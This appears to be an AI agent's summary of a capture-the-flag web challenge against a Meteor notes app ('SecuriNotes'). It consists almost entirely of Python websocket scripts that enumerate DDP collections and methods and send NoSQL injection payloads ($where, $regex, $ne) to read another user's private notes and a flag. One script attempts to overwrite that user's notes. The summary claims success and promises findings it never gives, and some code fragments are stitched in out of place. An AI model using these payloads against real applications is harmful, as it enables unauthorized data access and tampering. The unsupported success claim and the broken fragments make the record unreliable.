Task Summary: DDP Endpoint Analysis of SecuriNotes

I successfully created and executed scripts to analyze the Meteor DDP endpoint. Here are the key findings:

import websocket
import json
import time

def on_message(ws, message):
    print(f"[+] Received: {message}")

def on_error(ws, error):
    print(f"[-] Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("[*] Connection closed")

def on_open(ws):
    print("[+] Connected to DDP endpoint")
    
    # Connect message
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1"]
    }
    ws.send(json.dumps(connect_msg))
    
    # Try to list methods
    methods_msg = {
        "msg": "method",
        "method": "methods",
        "id": "1",
        "params": []
    }
    ws.send(json.dumps(methods_msg))
    
    # Try to subscribe to users collection
    sub_users_msg = {
        "msg": "sub",
        "id": "2",
        "name": "meteor.users",
        "params": []
    }
    ws.send(json.dumps(sub_users_msg))
    
    # Try to subscribe to notes collection
    sub_notes_msg = {
        "msg": "sub",
        "id": "3",
        "name": "notes",
        "params": []
    }
    ws.send(json.dumps(sub_notes_msg))
    
    # Try to list collections
    list_collections_msg = {
        "msg": "method",
        "method": "listCollections",
        "id": "4",
        "params": []
    }
    ws.send(json.dumps(list_collections_msg))

ws = websocket.WebSocketApp(
    "ws://web.chal.csaw.io:5000/websocket",
    on_open=on_open,
    on_message=on_message,
    on_error=on_error,
    on_close=on_close
)

ws.run_forever()

import websocket
import json
import time
import threading
import ssl

class DDPClient:
    def __init__(self, url):
        self.url = url
        self.ws = None
        self.connected = False
        self.session = None
        self.sub_id = 0
        
    def connect(self):
        websocket.enableTrace(True)
        self.ws = websocket.WebSocketApp(
            self.url,
            on_message=lambda ws, msg: self.on_message(msg),
            on_error=lambda ws, err: print(f"Error: {err}"),
            on_close=lambda ws: print("Connection closed"),
            on_open=lambda ws: self.on_open()
        )
        
        self.ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
        
    def on_open(self):
        print("Connected to DDP server")
        msg = {
            "msg": "connect",
            "version": "1",
            "support": ["1"]
        }
        self.ws.send(json.dumps(msg))
        
    def on_message(self, message):
        msg = json.loads(message)
        print(f"Received: {json.dumps(msg, indent=2)}")
        
        if msg.get("msg") == "connected":
            self.connected = True
            self.session = msg.get("session")
            print(f"DDP Connected! Session: {self.session}")
            
            # Subscribe to collections
            self.subscribe("users")
            self.subscribe("notes")
            
    def subscribe(self, name, params=None):
        if not self.connected:
            print("Not connected!")
            return
            
        self.sub_id += 1
        sub_msg = {
            "msg": "sub",
            "id": str(self.sub_id),
            "name": name,
            "params": params or []
        }
        print(f"Subscribing to {name}...")
        self.ws.send(json.dumps(sub_msg))
        
    def call_method(self, method, params=None):
        if not self.connected:
            print("Not connected!")
            return
            
        call_msg = {
            "msg": "method",
            "method": method,
            "params": params or [],
            "id": str(time.time())
        }
        print(f"Calling method {method}...")
        self.ws.send(json.dumps(call_msg))

if __name__ == "__main__":
    client = DDPClient("ws://web.chal.csaw.io:5000/websocket")
    client.connect()

import requests
import json

def inspect_meteor_collections():
    url = "http://web.chal.csaw.io:5000"
    
    # Try to find Terry's account or notes
    queries = [
        {"username": "terry"},
        {"username": "Terry"},
        {"author": "terry"},
        {"author": "Terry"},
        {"content": {"$regex": "terry", "$options": "i"}},
        {"title": {"$regex": "terry", "$options": "i"}}
    ]
    
    # Create session
    s = requests.Session()
    
    # Register and login
    register_data = {
        "username": "inspector",
        "password": "Inspector123!",
        "email": "inspector@test.com"
    }
    
    login_data = {
        "username": "inspector",
        "password": "Inspector123!"
    }
    
    # Register
    r = s.post(f"{url}/api/users/register", json=register_data)
    print("Register response:", r.text)
    
    # Login
    r = s.post(f"{url}/api/users/login", json=login_data)
    print("Login response:", r.text)
    
    # Try to query collections
    print("\nTrying to query collections...")
    for query in queries:
        try:
            r = s.post(f"{url}/api/notes/search", json=query)
            print(f"\nQuery {query}:")
            print(r.text)
        except Exception as e:
            print(f"Error with query {query}: {str(e)}")
            
    # Check for any exposed endpoints
    endpoints = [
        "/api/users",
        "/api/notes",
        "/api/notes/all",
        "/api/notes/public",
        "/api/users/list",
        "/api/users/search",
        "/.meteor/local-storage",
        "/minimongo"
    ]
    
    print("\nChecking endpoints...")
    for endpoint in endpoints:
        try:
            r = s.get(f"{url}{endpoint}")
            print(f"\nEndpoint {endpoint}:")
            print(r.text[:200])  # Print first 200 chars
        except Exception as e:
            print(f"Error with endpoint {endpoint}: {str(e)}")

if __name__ == "__main__":
    inspect_meteor_collections()

import websocket
import json
import time
import threading
import ssl

def on_message(ws, message):
    print(f"Received: {message}")
    
def on_error(ws, error):
    print(f"Error: {error}")
    
def on_close(ws):
    print("Connection closed")
    
def on_open(ws):
    # Initial connect message
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1"]
    }
    ws.send(json.dumps(connect_msg))
    
    # Try to create account
    create_user_msg = {
        "msg": "method",
        "method": "createUser",
        "params": [{
            "username": "testuser123",
            "email": "test@test.com",
            "password": "password123"
        }],
        "id": "1"
    }
    ws.send(json.dumps(create_user_msg))
    
    # Try to login
    login_msg = {
        "msg": "method",
        "method": "login",
        "params": [{
            "user": {"username": "testuser123"},
            "password": "password123"
        }],
        "id": "2"
    }
    ws.send(json.dumps(login_msg))
    
    # Subscribe to notes collection
    sub_msg = {
        "msg": "sub",
        "name": "notes",
        "params": [],
        "id": "3"
    }
    ws.send(json.dumps(sub_msg))

# Connect to WebSocket
ws = websocket.WebSocketApp(
    "ws://web.chal.csaw.io:5000/websocket",
    on_message = on_message,
    on_error = on_error,
    on_close = on_close,
    on_open = on_open
)

ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})

import websocket
import json
import time
import threading
import ssl

def on_message(ws, message):
    try:
        msg = json.loads(message)
        print(f"Received: {json.dumps(msg, indent=2)}")
        
        # Check for collection data
        if isinstance(msg, dict):
            if 'collection' in msg:
                print(f"[+] Collection found: {msg['collection']}")
            if 'minimongo' in str(msg).lower():
                print(f"[+] MinimongoDB reference found: {msg}")
            if 'terry' in str(msg).lower():
                print(f"[!!!] Terry reference found: {msg}")
            
    except Exception as e:
        print(f"Error processing message: {e}")

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("Connection closed")

def on_open(ws):
    print("Connection opened")
    
    # Connect to DDP
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1"]
    }
    ws.send(json.dumps(connect_msg))
    
    # Try common Meteor collection names
    collections = [
        "meteor_accounts_loginServiceConfiguration",
        "notes",
        "users",
        "user_notes",
        "private_notes",
        "terry_notes",
        "admin_notes",
        "system_notes"
    ]
    
    # Subscribe to collections
    for collection in collections:
        sub_msg = {
            "msg": "sub",
            "name": collection,
            "params": [],
            "id": collection
        }
        print(f"Subscribing to: {collection}")
        ws.send(json.dumps(sub_msg))
        time.sleep(0.5)
    
    # Try to list all users
    list_users = {
        "msg": "method",
        "method": "listUsers",
        "params": [],
        "id": "list_users"
    }
    ws.send(json.dumps(list_users))
    
    # Try to find Terry's notes specifically
    find_terry = {
        "msg": "method",
        "method": "findUserNotes",
        "params": [{"username": "terry"}],
        "id": "find_terry"
    }
    ws.send(json.dumps(find_terry))
    
    # Try some MongoDB queries through DDP
    mongo_queries = [
        {
            "msg": "method",
            "method": "find",
            "params": ["notes", {}],
            "id": "find_all_notes"
        },
        {
            "msg": "method",
            "method": "find",
            "params": ["users", {"username": "terry"}],
            "id": "find_terry_user"
        }
    ]
    
    for query in mongo_queries:
        print(f"Sending query: {json.dumps(query)}")
        ws.send(json.dumps(query))
        time.sleep(0.5)

# Connect to WebSocket
ws = websocket.WebSocketApp(
    "ws://web.chal.csaw.io:5000/websocket",
    on_message = on_message,
    on_error = on_error,
    on_close = on_close,
    on_open = on_open
)

ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})

        print(f"Params: {params}")
        print(f"Result: {result}\n")

        "user_notes",

        except Exception as e:
            print(f"Failed to subscribe to {collection}: {str(e)}\n")

if __name__ == "__main__":

import websocket
import json
import time

def on_message(ws, message):
    print(f"Received: {message}")

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("### closed ###")

def on_open(ws):
    print("Connected!")
    
    # Send connect message
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1"]
    }
    ws.send(json.dumps(connect_msg))
    
    # Test various method calls
    methods = [
        ("method", "getNote", [{"noteId": {"$ne": None}}]),
        ("method", "getNote", [{"userId": "terry"}]),
        ("method", "getNotes", [{}]),
        ("method", "getPrivateNotes", [{}]),
        ("method", "getAllNotes", [{}]),
        ("sub", "notes", []),
        ("sub", "private_notes", []),
        ("sub", "terry_notes", []),
        ("sub", "user_notes", []),
        ("method", "getNote", [{"$where": "true"}]),
        ("method", "getNote", [{"content": {"$regex": "flag{.*}"}}])
    ]
    
    for idx, (msg_type, method, params) in enumerate(methods):
        message = {
            "msg": msg_type,
            "method": method if msg_type == "method" else None,
            "name": method if msg_type == "sub" else None,
            "params": params,
            "id": str(idx + 1)
        }
        message = {k: v for k, v in message.items() if v is not None}
        print(f"Sending: {json.dumps(message)}")
        ws.send(json.dumps(message))
        time.sleep(1)

if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp("ws://web.chal.csaw.io:5000/websocket",
                              on_message=on_message,
                              on_error=on_error,
                              on_close=on_close)
    ws.on_open = on_open
    ws.run_forever()

import websocket
import json
import time

def on_message(ws, message):
    print(f"Received: {message}")

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("### closed ###")

def on_open(ws):
    print("Connected!")
    
    # Send connect message
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1"]
    }
    ws.send(json.dumps(connect_msg))
    
    # Test various method calls with MongoDB-specific queries
    methods = [
        ("method", "getNote", [{"noteId": "1"}]),
        ("method", "getNote", [{"$where": "this.owner === 'terry'"}]),
        ("method", "updateNote", [{"$where": "true"}, {"$set": {"read": True}}]),
        ("method", "notes.find", [{"owner": "terry"}]),
        ("method", "notes.findOne", [{"owner": "terry"}]),
        ("method", "notes.update", [{"owner": "terry"}, {"$set": {"read": True}}]),
        ("sub", "notes", [{"owner": "terry"}]),
        ("sub", "notes", [{"type": "private"}]),
        ("method", "getNoteById", ["1"]),
        ("method", "getNoteByUser", ["terry"]),
        ("method", "findNotes", [{"$or": [{"owner": "terry"}, {"shared": "terry"}]}]),
        ("method", "searchNotes", [{"content": {"$regex": ".*password.*"}}])
    ]
    
    for idx, (msg_type, method, params) in enumerate(methods):
        message = {
            "msg": msg_type,
            "method": method if msg_type == "method" else None,
            "name": method if msg_type == "sub" else None,
            "params": params,
            "id": str(idx + 1)
        }
        message = {k: v for k, v in message.items() if v is not None}
        print(f"Sending: {json.dumps(message)}")
        ws.send(json.dumps(message))
        time.sleep(1)

if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp("ws://web.chal.csaw.io:5000/websocket",
                              on_message=on_message,
                              on_error=on_error,
                              on_close=on_close)
    ws.on_open = on_open
    ws.run_forever()

import websocket
import json
import time

def on_message(ws, message):
    print(f"Received: {message}")

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("### closed ###")

def on_open(ws):
    print("Connected!")
    
    # Send connect message
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1"]
    }
    ws.send(json.dumps(connect_msg))
    
    # Test various method calls based on the app.js source
    methods = [
        ("method", "notes.private", [{}]),
        ("method", "notes.count", [{"body": {"$ne": ""}}]),
        ("method", "notes.remove", ["admin"]),
        ("method", "notes.update", [{"body": "test"}]),
        ("sub", "notes.private", [{}]),
        ("method", "users.update", [{"$where": "this.username === 'terry'"}]),
        ("method", "notes.count", [{"owner": "terry"}]),
        ("method", "notes.find", [{"owner": "terry"}]),
        ("method", "notes.findOne", [{"owner": "terry"}]),
        ("method", "notes.update", [{"owner": "terry"}, {"$set": {"body": "Hacked!"}}])
    ]
    
    for idx, (msg_type, method, params) in enumerate(methods):
        message = {
            "msg": msg_type,
            "method": method if msg_type == "method" else None,
            "name": method if msg_type == "sub" else None,
            "params": params,
            "id": str(idx + 1)
        }
        message = {k: v for k, v in message.items() if v is not None}
        print(f"Sending: {json.dumps(message)}")
        ws.send(json.dumps(message))
        time.sleep(1)

    # Try some NoSQL injection in the notes.count method
    nosql_methods = [
        ("method", "notes.count", [{"$where": "this.owner === 'terry'"}]),
        ("method", "notes.count", [{"owner": {"$regex": ".*"}}]),
        ("method", "notes.count", [{"owner": "terry", "body": {"$regex": "flag{.*}"}}]),
        ("method", "notes.count", [{"owner": "terry", "$or": [{"body": {"$regex": "password"}}, {"body": {"$regex": "flag"}}]}])
    ]
    
    for idx, (msg_type, method, params) in enumerate(nosql_methods, start=len(methods)):
        message = {
            "msg": msg_type,
            "method": method if msg_type == "method" else None,
            "name": method if msg_type == "sub" else None,
            "params": params,
            "id": str(idx + 1)
        }
        message = {k: v for k, v in message.items() if v is not None}
        print(f"Sending: {json.dumps(message)}")
        ws.send(json.dumps(message))
        time.sleep(1)

if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp("ws://web.chal.csaw.io:5000/websocket",
                              on_message=on_message,
                              on_error=on_error,
                              on_close=on_close)
    ws.on_open = on_open
    ws.run_forever()

import websocket
import json
import time

def on_message(ws, message):
    print(f"Received: {message}")

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("### closed ###")

def on_open(ws):
    print("Connected!")
    
    # Send connect message
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1"]
    }
    ws.send(json.dumps(connect_msg))
    
    # Test regex injection payloads
    payloads = [
        {"owner": "terry"},
        {"owner": "admin"},
        {"owner": {"$regex": "terry"}},
        {"owner": {"$exists": True}, "$where": "this.owner === 'terry'"},
        {"owner": "terry", "body": {"$regex": ".*pass.*"}},
        {"owner": "terry", "body": {"$regex": ".*secret.*"}},
        {"owner": "terry", "body": {"$regex": ".*token.*"}},
        {"owner": "terry", "body": {"$regex": ".*key.*"}},
        {"owner": "terry", "body": {"$regex": ".*flag.*"}},
        {"owner": "terry", "body": {"$regex": ".*\{.*"}},
        {"owner": "terry", "$or": [{"body": {"$regex": "password"}}, {"body": {"$regex": "flag"}}]},
        {"owner": "terry", "$or": [{"body": {"$regex": ".*\{.*"}}, {"body": {"$regex": ".*\}.*"}}]},
        {"$or": [{"owner": "terry"}, {"owner": "admin"}], "body": {"$regex": "flag\{.*\}"}},
        {"owner": "terry", "body": {"$regex": "flag\{[^}]*\}"}},
        {"$where": "this.owner === 'terry' && this.body.match(/flag{.*}/)"} 
    ]
    
    for idx, payload in enumerate(payloads):
        message = {
            "msg": "method",
            "method": "notes.count",
            "params": [payload],
            "id": str(idx + 1)
        }
        print(f"Sending: {json.dumps(message)}")
        ws.send(json.dumps(message))
        time.sleep(1)

if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp("ws://web.chal.csaw.io:5000/websocket",
                              on_message=on_message,
                              on_error=on_error,
                              on_close=on_close)
    ws.on_open = on_open
    ws.run_forever()
